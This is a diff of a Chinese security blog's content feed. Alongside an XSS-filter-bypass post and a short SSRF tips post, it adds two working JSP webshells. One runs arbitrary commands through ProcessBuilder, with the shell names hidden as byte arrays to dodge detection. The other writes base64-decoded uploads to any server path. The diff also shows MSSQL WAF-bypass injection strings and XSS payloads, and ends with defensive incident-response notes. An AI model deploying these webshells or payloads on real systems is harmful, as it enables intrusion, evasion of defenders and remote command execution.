@@ -2614,14 +2614,14 @@
 
 <p>.text()<strong>利用text属性会解析html编码的特性</strong>得到我们想要的未编码的payload</p>
 <p>错误解析：</p>
-<p><img src="/2020/12/04/XSS%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/XSS%E6%B7%B1%E5%85%A5/E:%5Cblog%5Csource_posts%5CXSS%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93%5Cimage-20201204113356121.png" alt="image-20201204113356121"></p>
-<p><img src="/2020/12/04/XSS%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/XSS%E6%B7%B1%E5%85%A5/E:%5Cblog%5Csource_posts%5CXSS%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93%5Cimage-20201204113512180.png" alt="image-20201204113512180"></p>
+<p><img src="/2020/12/04/XSS%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/XSS%E6%B7%B1%E5%85%A5/image-20201204113356121.png" alt="image-20201204113356121"></p>
+<p><img src="/2020/12/04/XSS%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/XSS%E6%B7%B1%E5%85%A5/image-20201204113512180.png" alt="image-20201204113512180"></p>
 <p>正确解析：</p>
-<p><img src="/2020/12/04/XSS%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/XSS%E6%B7%B1%E5%85%A5/E:%5Cblog%5Csource_posts%5CXSS%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93%5Cimage-20201204113440356.png" alt="image-20201204113440356"></p>
+<p><img src="/2020/12/04/XSS%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/XSS%E6%B7%B1%E5%85%A5/image-20201204113440356.png" alt="image-20201204113440356"></p>
 <p>constructor其实就是取<code>$(&quot;#xx&quot;)</code>这个JQuery对象的构造器，然后往构造器里面传参<code>&lt;img src=x onerror=alert(1)</code>。</p>
-<p><img src="/2020/12/04/XSS%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/XSS%E6%B7%B1%E5%85%A5/E:%5Cblog%5Csource_posts%5CXSS%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93%5Cimage-20201204110207474.png" alt="image-20201204110207474"></p>
+<p><img src="/2020/12/04/XSS%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/XSS%E6%B7%B1%E5%85%A5/image-20201204110207474.png" alt="image-20201204110207474"></p>
 <p>这个应该是重写了$选择器的方法</p>
-<p><img src="/2020/12/04/XSS%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/XSS%E6%B7%B1%E5%85%A5/E:%5Cblog%5Csource_posts%5CXSS%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93%5Cimage-20201204110442141.png" alt="image-20201204110442141"></p>
+<p><img src="/2020/12/04/XSS%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/XSS%E6%B7%B1%E5%85%A5/image-20201204110442141.png" alt="image-20201204110442141"></p>
 <p>默认谷歌扩展的js弹窗了</p>
 <h3 id="Constructor弹框"><a href="#Constructor弹框" class="headerlink" title="Constructor弹框"></a>Constructor弹框</h3><p>两类触发原理进行了区分</p>
 <ul>
@@ -2659,14 +2659,14 @@
 </ol>
 <p>引出第六种&lt;!–解析闭合scrpit跳出分号的解析。</p>
 <p><strong>要点1：</strong>再去试试反斜线，如果这个没有过滤，那么 &#39; 就会被过滤为 \‘ 这样等于是将反斜线进行了转义，所以后面的单引号就没有被转义了，那么就可以闭合代码里单引号，从而跳出单引号限制了。 </p>
-<p><img src="/2020/12/04/XSS%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/XSS%E6%B7%B1%E5%85%A5/E:%5Cblog%5Csource_posts%5CXSS%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93%5Cimage-20201205120350919.png" alt="image-20201205120350919"></p>
+<p><img src="/2020/12/04/XSS%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/XSS%E6%B7%B1%E5%85%A5/image-20201205120350919.png" alt="image-20201205120350919"></p>
 <p>因为转义字符都是两个两个出现的，这样单个出现相当于此处的反斜杠去转义了后面的那个反斜杠，单引号进行闭合，破坏了转义的奇偶性。</p>
 <p><strong>要点2：</strong>&lt;!– 后面在遇到&lt;script&gt;标签，那么那么最近的另一个&lt;/script&gt;标签就会优先去先闭合这个，从而打破了原先跳不出script标签限制的这个点。实际上如果遇到转义尖括号，那么可以\&lt;script \&gt;这样去bypass正确解析。（加个空格）</p>
 <p>payload：?px=111%27-alert(1)-`//%3C!–%3Cscript%20</p>
-<p><img src="/2020/12/04/XSS%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/XSS%E6%B7%B1%E5%85%A5/E:%5Cblog%5Csource_posts%5CXSS%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93%5Cimage-20201205142349732.png" alt="image-20201205142349732"></p>
+<p><img src="/2020/12/04/XSS%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/XSS%E6%B7%B1%E5%85%A5/image-20201205142349732.png" alt="image-20201205142349732"></p>
 <p>像这样输入进去发现并不会弹窗：</p>
-<p><img src="/2020/12/04/XSS%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/XSS%E6%B7%B1%E5%85%A5/E:%5Cblog%5Csource_posts%5CXSS%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93%5Cimage-20201205142541650.png" alt="image-20201205142541650"></p>
-<p><img src="/2020/12/04/XSS%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/XSS%E6%B7%B1%E5%85%A5/E:%5Cblog%5Csource_posts%5CXSS%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93%5Cimage-20201205163742296.png" alt="image-20201205163742296"></p>
+<p><img src="/2020/12/04/XSS%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/XSS%E6%B7%B1%E5%85%A5/image-20201205142541650.png" alt="image-20201205142541650"></p>
+<p><img src="/2020/12/04/XSS%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/XSS%E6%B7%B1%E5%85%A5/image-20201205163742296.png" alt="image-20201205163742296"></p>
 <p>发现第一行的这个表达式在后面加入反引号的模板注释并不会执行，但是加入单行的多行注入在此处却可以执行成功，有点好奇。将反引号`放在alert后在–拼接即可。</p>
 <p>令我好奇的是反引号的注释并不影响这&lt;!– 的功能。这证明了这个解析级至少是高于反引号的注释的。更不用说出现在字符串中。</p>
 ]]></content>
@@ -2807,7 +2807,22 @@
 <p>​    因为利用的是动态二进制的加密 ，所以需要class文件的动态生成，不能每次都去编译。所以涉及到了java的asm框架。ASM 可以直接产生二进制 class 文件，也可以在类被加载入 Java 虚拟机之前动态改变类行为，也就是动态修改class文件中的属性值。</p>
 <p><img src="/2020/12/08/jsp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/jsp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/2020.png" alt></p>
 <p>需要执行的命令是编码在class文件中的，因为class是已编译好的文件。但不能每次执行命令时都编译payload，那么就需要payload可以接收参数。为了参数被waf拦截，自然也是二进制流，所以作者使用ASM框架来动态修改class文件中的属性值。从上面的代码就可以看出，只需要向getParamedClass方法传递payload类名、参数列表即可获得经过参数化的payload class。</p>
-<h2 id="0x05-安全防范"><a href="#0x05-安全防范" class="headerlink" title="0x05 安全防范"></a>0x05 安全防范</h2><p>前提条件是：你的 Java Web 应用没有在 Jsp 中直接使用任何 Java 代码，否则会对应用本身造成影响。</p>
+<h2 id="0x05-用ProcessBuilder绕过检测"><a href="#0x05-用ProcessBuilder绕过检测" class="headerlink" title="0x05 用ProcessBuilder绕过检测"></a>0x05 用ProcessBuilder绕过检测</h2><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%Runtime.getRuntime().exec(request.getParameter(<span class="string">"i"</span>));%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Runtime, exec 字眼太过刺眼。所以可以使用ProcessBuilder类创建。</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;%@ page pageEncoding=<span class="string">"utf-8"</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.Scanner"</span> %&gt;</span><br><span class="line">&lt;HTML&gt;</span><br><span class="line">&lt;title&gt;Just For Fun&lt;/title&gt;</span><br><span class="line">&lt;BODY&gt;</span><br><span class="line">&lt;H3&gt;Build By V1rus&lt;/H3&gt;</span><br><span class="line">&lt;FORM METHOD=<span class="string">"POST"</span> NAME=<span class="string">"form"</span> ACTION=<span class="string">"#"</span>&gt;</span><br><span class="line">    &lt;INPUT TYPE=<span class="string">"text"</span> NAME=<span class="string">"q"</span>&gt;</span><br><span class="line">    &lt;INPUT TYPE=<span class="string">"submit"</span> VALUE=<span class="string">"F*ck"</span>&gt;</span><br><span class="line">&lt;/FORM&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    String op=<span class="string">"Got Nothing"</span>;</span><br><span class="line">    String query = request.getParameter(<span class="string">"q"</span>);</span><br><span class="line">    String fileSeparator = String.valueOf(java.io.File.separatorChar);</span><br><span class="line">    Boolean isWin;</span><br><span class="line">    <span class="keyword">if</span>(fileSeparator.equals(<span class="string">"\\"</span>))&#123;</span><br><span class="line">        isWin = <span class="keyword">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        isWin = <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (query != <span class="keyword">null</span>) &#123;</span><br><span class="line">        ProcessBuilder pb;</span><br><span class="line">        <span class="keyword">if</span>(isWin) &#123;</span><br><span class="line">            pb = <span class="keyword">new</span> ProcessBuilder(<span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">99</span>, <span class="number">109</span>, <span class="number">100</span>&#125;), <span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">47</span>, <span class="number">67</span>&#125;), query);<span class="comment">//cmd /c  windows系统</span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            pb = <span class="keyword">new</span> ProcessBuilder(<span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">47</span>, <span class="number">98</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">47</span>, <span class="number">98</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">104</span>&#125;), <span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">45</span>, <span class="number">99</span>&#125;), query); <span class="comment">// /bin/bash   linux系统</span></span><br><span class="line">        &#125;</span><br><span class="line">        Process process = pb.start();</span><br><span class="line">        Scanner sc = <span class="keyword">new</span> Scanner(process.getInputStream()).useDelimiter(<span class="string">"\\A"</span>);</span><br><span class="line">        op = sc.hasNext() ? sc.next() : op;</span><br><span class="line">        sc.close();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;PRE&gt;</span><br><span class="line">    &lt;%= op %&gt;&gt;</span><br><span class="line">&lt;/PRE&gt;</span><br><span class="line">&lt;/BODY&gt;</span><br><span class="line">&lt;/HTML&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x06-二进制文件上传技巧"><a href="#0x06-二进制文件上传技巧" class="headerlink" title="0x06 二进制文件上传技巧"></a>0x06 二进制文件上传技巧</h2><p>​    当我们有新建文本文件权限，但被限制上传、不能远程下载文件时，可以试试将二进制字符串编码（具体涉及的可以有很多种，这里采用base64的方式）：</p>
+<p>1、 base64命令</p>
+<p><img src="/2020/12/08/jsp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/jsp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/E:%5Cblog%5Csource_posts%5Cjsp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%5Cimage-20201210114440522.png" alt="image-20201210114440522"></p>
+<p>这里一定要加上-i参数 该参数用于忽略非字母表字符，比如换行符。因为在POST提交过程中貌似要被添加上换行符。 如果转出来的exe不能使用最好试试这个-i选项。</p>
+<p>2、 上传解码base写入文件的shell</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.*,java.io.*"</span> pageEncoding=<span class="string">"UTF-8"</span> contentType=<span class="string">"text/html; charset=utf-8"</span>%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">        request.setCharacterEncoding(<span class="string">"utf-8"</span>);</span><br><span class="line">        String filePath = request.getParameter(<span class="string">"filePath"</span>);</span><br><span class="line">        String content = request.getParameter(<span class="string">"content"</span>);</span><br><span class="line">        String base64Flag = request.getParameter(<span class="string">"base64"</span>);</span><br><span class="line">        String msg = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">if</span>(content != <span class="keyword">null</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                        File file = <span class="keyword">new</span> File(filePath);</span><br><span class="line">                        OutputStream os = <span class="keyword">new</span> FileOutputStream(file);</span><br><span class="line">                        <span class="keyword">byte</span>[] bytes = <span class="keyword">null</span>;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="string">"on"</span>.equals(base64Flag))&#123;</span><br><span class="line">                                bytes = <span class="keyword">new</span> sun.misc.BASE64Decoder().decodeBuffer(content);</span><br><span class="line">                        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                                bytes = content.getBytes(<span class="string">"utf-8"</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        os.write(bytes);</span><br><span class="line">                        os.close();</span><br><span class="line">                        msg = <span class="string">"success"</span>;</span><br><span class="line">                &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">                        msg = <span class="string">"error"</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">        &lt;head&gt;</span><br><span class="line">        &lt;/head&gt;</span><br><span class="line">        &lt;body&gt;</span><br><span class="line">                &lt;font color="red"&gt;&lt;%=msg%&gt;&lt;/font&gt;</span><br><span class="line">                &lt;form action=<span class="string">""</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">                        &lt;table&gt;</span><br><span class="line">                                &lt;tr&gt;</span><br><span class="line">                                        &lt;td&gt;本文件路径：&lt;/td&gt;</span><br><span class="line">                                        &lt;td&gt;&lt;%=application.getRealPath("")%&gt;&lt;/td&gt;</span><br><span class="line">                                &lt;/tr&gt;</span><br><span class="line">                                &lt;tr&gt;</span><br><span class="line">                                        &lt;td&gt;保存路径：&lt;/td&gt;</span><br><span class="line">                                        &lt;td&gt;&lt;input type="text" size="60" name="filePath"/&gt;&lt;input type="checkbox" name="base64"/&gt;base64解码保存&lt;/td&gt;</span><br><span class="line">                                &lt;/tr&gt;</span><br><span class="line">                                &lt;tr valign=<span class="string">"top"</span>&gt;</span><br><span class="line">                                        &lt;td&gt;大马内容:&lt;/td&gt;</span><br><span class="line">                                        &lt;td&gt;&lt;textarea rows="20" cols="70" name="content"&gt;&lt;/textarea&gt;&lt;/td&gt;</span><br><span class="line">                                &lt;/tr&gt;</span><br><span class="line">                                &lt;tr align=<span class="string">"right"</span>&gt;</span><br><span class="line">                                        &lt;td&gt; &lt;/td&gt;</span><br><span class="line">                                        &lt;td&gt;&lt;input type="submit" value="保存"/&gt;&lt;/td&gt;</span><br><span class="line">                                &lt;/tr&gt;</span><br><span class="line">                        &lt;/table&gt;</span><br><span class="line">                &lt;/form&gt;</span><br><span class="line">        &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>用post提交数据，base64Flag为on</p>
+<h2 id="0x06-安全防范"><a href="#0x06-安全防范" class="headerlink" title="0x06 安全防范"></a>0x06 安全防范</h2><p>前提条件是：你的 Java Web 应用没有在 Jsp 中直接使用任何 Java 代码，否则会对应用本身造成影响。</p>
 <p>方法：</p>
 <p>在 web.xml 文件中加下以下配置：</p>
 <figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;jsp-config&gt;</span><br><span class="line"></span><br><span class="line">	&lt;jsp-property-group&gt;</span><br><span class="line"></span><br><span class="line">		&lt;url-pattern&gt;*.jspx&lt;/url-pattern&gt;</span><br><span class="line"></span><br><span class="line">		&lt;url-pattern&gt;*.jsp&lt;/url-pattern&gt;</span><br><span class="line"></span><br><span class="line">		&lt;scripting-invalid&gt;true&lt;/scripting-invalid&gt;</span><br><span class="line"></span><br><span class="line">	&lt;/jsp-property-group&gt;</span><br><span class="line"></span><br><span class="line">&lt;/jsp-config&gt;</span><br></pre></td></tr></table></figure>
@@ -2822,6 +2837,7 @@
 </ol>
 <p><a href="https://zgao.top/" target="_blank" rel="noopener">https://zgao.top/</a></p>
 <p><a href="https://xz.aliyun.com/t/2744" target="_blank" rel="noopener">https://xz.aliyun.com/t/2744</a></p>
+<p><a href="https://github.com/LandGrey/webshell-detect-bypass/blob/master/docs/using-java-reflection-and-ClassLoader-bypass-webshell-detection/using-java-reflection-and-ClassLoader-bypass-webshell-detection.md" target="_blank" rel="noopener">https://github.com/LandGrey/webshell-detect-bypass/blob/master/docs/using-java-reflection-and-ClassLoader-bypass-webshell-detection/using-java-reflection-and-ClassLoader-bypass-webshell-detection.md</a></p>
 ]]></content>
   </entry>
   <entry>
@@ -2971,6 +2987,172 @@
 <p>id=1;Exec(‘WA’+’ITFOR DELAY ‘’0:0:5’’’)</p>
 <p>id=1;declare @test nvarchar(50);set @test=’wait’+’for delay ‘’0:0:5’’’;exec sp_executesql @test</p>
 <h4 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h4><p>1、首先填充方式：MSSQL可以看出来<strong>%00-%20的填充符号</strong>、<strong>注释符号</strong>、<strong>特殊符号交集</strong>在这些中间是通用的，先fuzz这些通用符号（00-20,2a,2f,2e,3a），如果都不行，那么ASP可能首先没办法绕过（因为位置二的关系）。aspx再针对每个位置去fuzz。</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>ssrf挖掘技巧/ssrf挖掘技巧</title>
+    <url>/2020/12/22/ssrf%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7/ssrf%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7/</url>
+    <content><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>​    很久没更新呢是因为结石了，恢复了很久。一定要多运动多跳！写这个呢也是因为ssrf可利用的面挺广的，所以要先找出点再后渗透，也附带修复建议。</p>
+<h2 id="0x02-简介"><a href="#0x02-简介" class="headerlink" title="0x02 简介"></a>0x02 简介</h2><h2 id="0x03-可能存在的坑"><a href="#0x03-可能存在的坑" class="headerlink" title="0x03 可能存在的坑"></a>0x03 可能存在的坑</h2><ul>
+<li>测试支持的协议:http、https、gopher、telnet 等协议。</li>
+<li>SSRF 的类型为无状态型 SSRF ，即不管你请求的端口是否开放、协议是否支持、网站是否能访问 返回的状态都是一样的，你无法通过它扫描端口开放情况和使用 file 协议读取本地信息。</li>
+<li>不支持 302 跳转</li>
+</ul>
+<h2 id="0x04-技巧"><a href="#0x04-技巧" class="headerlink" title="0x04 技巧"></a>0x04 技巧</h2><p>1、后缀名检测</p>
+<p>输入<a href="https://link.zhihu.com/?target=http%3A//ceye.io">http://ceye.io</a>却发现并没有回显请求，这是因为这种地方一般会对<strong>后缀</strong>做一个检测，如果不是jpg或者其他图片后缀的话并不会通过，不过好在<a href="https://link.zhihu.com/?target=http%3A//ceye.io">http://ceye.io</a>是很强大的，我们可以随便构造，<a href="https://link.zhihu.com/?target=http%3A//abcdef.ceye.io/ichunqiu.jpg">http://abcdef.ceye.io/ichunqiu.jpg</a>, 对其进行输入，再去观察有无回显。</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>面试问题整理/1</title>
+    <url>/2020/12/24/%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98%E6%95%B4%E7%90%86/1/</url>
+    <content><![CDATA[<h2 id="一、-入侵溯源中的常见姿势"><a href="#一、-入侵溯源中的常见姿势" class="headerlink" title="一、 入侵溯源中的常见姿势"></a>一、 入侵溯源中的常见姿势</h2><h3 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h3><p>​    攻击溯源作为安全事故中事后响应的重要组成部分，通过对受害资产与<strong>内网流量进行分析</strong>一定程度上<strong>还原攻击者的攻击路径与攻击手法</strong>，有助于<strong>修复漏洞</strong>与风险避免二次事件的发生。攻击知识可转换成防御优势,如果能够做到积极主动且有预见性，就能更好地控制后果。</p>
+<p>​    简而言之就是如何被黑的要弄明白，再去做好防御。</p>
+<h3 id="0x01-主题思路"><a href="#0x01-主题思路" class="headerlink" title="0x01 主题思路"></a>0x01 主题思路</h3><h4 id="1、web系统"><a href="#1、web系统" class="headerlink" title="1、web系统"></a>1、web系统</h4><p>​    用户被感知的异常点：</p>
+<p>1.网页被篡改、被挂上了黑链、web文件丢失等 </p>
+<p>2.数据库被篡改、web系统运行异常影响可用性、web用户密码被篡改等 </p>
+<p>3.主机出现运行异常反应卡顿、文件被加密、主机系统出现其他用户等 </p>
+<p>4.主机流量层出现大量异常流量</p>
+<p>​    1、初步进行信息收集</p>
+<p>​    <strong>出现异常的时间点（非常重要）</strong></p>
+<p>​    异常服务器的主要业务情况、大致的一个网络拓扑是不是在DMZ区、是否可以公网访问、开放了那些端口、是否有打补丁、使用了怎么样的一个web技术、最近是否做过什么变更、有没有什么安全设备之类的。</p>
+<p>​    2、去查看中间件的日志</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.apache的日志路径一般配置在httpd.conf的目录下或者位于&#x2F;var&#x2F;log&#x2F;http </span><br><span class="line">2.IIS的日志默认在系统目录下的Logfiles下的目录当中 </span><br><span class="line">3.tomcat 一般位于tomcat安装目录下的一个logs文件夹下面 </span><br><span class="line">4.Nginx日志一般配置在nginx.conf或者vhost的conf文件中 日志一般以日期命名，方便后续审计与安全人员进行分析。</span><br></pre></td></tr></table></figure>
+
+<p>根据之前收集到的出现异常的时间点，对时间点前后的请求日志进行分析。工具推荐：web-log-parser为开源的分析web日志工具。</p>
+<p>一些常见的入口点：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.一些CMS的EXP，比如Discuz Empire Spring 之类的一些命令执行、权限绕过逻辑漏洞等因为比较通用，网上很多都是公开的所以涉及面相对较广。 </span><br><span class="line">2.编辑器的上传漏洞，比如知名的FCK编辑器、UEditor之类。 </span><br><span class="line">3.功能性上传过滤不严格，比如头像上传资料上传界面一些过滤严格导致的上传漏洞。 </span><br><span class="line">4.Web系统的弱口令问题 admin账户、或者是tomcat的manager用户弱口令 、Axis2弱口令用户、Openfire弱口令等等</span><br></pre></td></tr></table></figure>
+
+<p>同时web系统往往容易存在一些webshell的情况，经常在一些上传目录里面找到一些webshell，用d盾进行一个扫描。</p>
+<h4 id="2、主机系统"><a href="#2、主机系统" class="headerlink" title="2、主机系统"></a>2、主机系统</h4><p>windows蠕虫病毒很多传播方法只是依靠暴力破解和MS17-010之类的漏洞传播。</p>
+<p>Linux平台相对安全性偏高一些，常见的几个病毒如XorDDOS、DDG、XNote系列的普遍也是依靠暴力破解进行传播</p>
+<p>总结：溯源的过程中也重点考虑<strong>暴力破解</strong></p>
+<h5 id="linux："><a href="#linux：" class="headerlink" title="linux："></a>linux：</h5><p><strong>查看历史命令</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">history</span><br><span class="line">cat .bash_history</span><br></pre></td></tr></table></figure>
+
+<p><strong>查看是否存在可疑用户</strong></p>
+<p>查看是否存在和root一样的特权用户<code>awk -F: &#39;$3==0{print $1}&#39; /etc/passwd</code></p>
+<p><strong>查看登录失败日志</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lastb</span><br></pre></td></tr></table></figure>
+
+<p><strong>查看用户登录情况</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lastlog</span><br></pre></td></tr></table></figure>
+
+<p><strong>查看是否存在可疑定时任务</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crontab -l</span><br></pre></td></tr></table></figure>
+
+<p><strong>查看是否存在可疑网络连接</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netstat -anlpt</span><br></pre></td></tr></table></figure>
+
+<p>如果发现可疑连接查看对应的pid即可知道具体信息</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ls -l &#x2F;proc&#x2F;PID&#x2F;exe</span><br></pre></td></tr></table></figure>
+
+<p><strong>查看是否存在可疑进程</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ps -aux</span><br></pre></td></tr></table></figure>
+
+<p>如发现可疑进程定位如上方法</p>
+<p><strong>查看可疑的开机自启程序</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl list-unit-files</span><br></pre></td></tr></table></figure>
+
+<p><strong>查看是否存在webshell</strong></p>
+<p>可以利用edr、gscan等工具扫描然后人工进行排查</p>
+<p>常用的一些日志举例如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;var&#x2F;log&#x2F;auth.log 包含系统授权信息，包括用户登录和使用的权限机制等信息</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;lastlog 记录登录的用户，可以使用命令lastlog查看</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;secure 记录大多数应用输入的账号与密码，登录成功与否 </span><br><span class="line">&#x2F;var&#x2F;log&#x2F;cron 记录crontab命令是否被正确的执行</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">grep,sed,sort,awk几个命令灵活运用、关注Accepted、Failed password 、invalid特殊关键字一般也能轻松发现一</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat secure | grep Accepted 去查看一下成功登录的情况</span><br><span class="line">history命令去查看</span><br><span class="line">cat &#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log | grep -E &quot;wp-admin|wp-login|POST &#x2F;&quot; -E可扩展的正则表达式</span><br><span class="line">cat &#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log | grep xx.xx.xx.xx 查找到可以的成功访问在对ip进行查找 </span><br><span class="line">apache最常用的日志access.log和error.log。</span><br></pre></td></tr></table></figure>
+
+
+
+<p>如果这些日志被清除了就去网络层面上面安全设备流量层看看。</p>
+<h5 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h5><p>主要还是依靠windows的日志一般用 eventvwr命令打开事件查看器。默认分为三类：应用程序、安全、性统 以evt文件形式存储%systemroot%\system32\config目录：</p>
+<p>1、合理使用筛选器往往可以帮助我们更好的排查日志，比如怀疑是暴力破解入侵的筛选事件ID == 4625审核失败的日志，后续通过对时间的排查、以及源IP地址、类型与请求的频率进行分析来判断是否是来源于内网的暴力破解。</p>
+<p>2、通过系统内部的日志来判断是否是恶意进程的运行状态。</p>
+<p>通过对logontype的数值确认就可以确认到底是通过什么协议进行暴力破解成功的。</p>
+<p>ms17-010 ms08-067 ms16-032等安全补丁都是内网渗透常用的攻击包。可以通过sysintemfo可以查看到当前系统当中已经安装的补丁。</p>
+<p><strong>查看是否有新增可疑账号</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lusrmgr.msc</span><br></pre></td></tr></table></figure>
+
+<p><strong>查看安全日志,windows日志，安全</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eventvwr.msc</span><br></pre></td></tr></table></figure>
+
+<p><strong>查找异常端口</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure>
+
+<p><strong>跟进异常端口</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic process pid</span><br></pre></td></tr></table></figure>
+
+<p><strong>查看敏感启动项目</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msconfig</span><br></pre></td></tr></table></figure>
+
+<h5 id="其他常用系统"><a href="#其他常用系统" class="headerlink" title="其他常用系统"></a>其他常用系统</h5><p>数据库系统也是攻击者入口点的一些重灾区，常见的比如msssql server由于数据往往在window环境下安装后具有较高的权限，一些用户经常安装完成之后也不会怎么去加固数据库，基于库站分离的原则很多mssql公网直接就可以访问访问控制策略比较弱，弱口令的问题尤为突出。</p>
+<p>比如：mssql的sa用户暴力破解日志，爆破成功之后启动xp_shell往往就可以以高权限执行系统命令。</p>
+<p>储存过程执行命令：<a href="https://www.jianshu.com/p/2d3d46f84cfd" target="_blank" rel="noopener">https://www.jianshu.com/p/2d3d46f84cfd</a></p>
+<p>Linux平台下面的redis也很热门，就一个几年的默认安装后的未授权访问的问题却流传的相对广泛。比如最近一段事件相对比较热门的DDG挖矿、WatchDog挖矿等病毒都主要利用redis未授权访问执行命令，从互联网拉取挖矿程序写入ssh的公钥等功能。</p>
+<p>mysql数据库暴力破解提权一套装、hadoop未授权访问漏洞、钓鱼邮件、破解软件后门、恶意的office宏、office的代码执行漏洞、邮箱缺陷、V**配置缺陷等情况都可能是攻击者的入口点具体情况需要结合用户当前的情况具体进行排查。</p>
